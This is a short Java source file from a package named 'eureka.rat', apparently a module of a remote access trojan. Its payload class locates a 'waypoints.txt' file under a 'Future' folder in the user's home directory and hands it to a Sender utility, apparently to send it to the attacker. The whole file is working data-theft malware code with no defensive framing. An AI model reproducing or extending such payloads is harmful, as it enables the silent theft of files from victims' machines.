package eureka.rat.features;

import eureka.rat.utils.Sender;
import eureka.rat.payloads.Payload;

import java.io.File;
import java.util.Optional;

public class Future implements Payload {
    @Override
    public void execute() {
        Optional<File> waypoints = Sender.getFile(System.getProperty("user.home") + "\\Future\\" + "waypoints.txt");
        waypoints.ifPresent(Sender::send);
    }
}
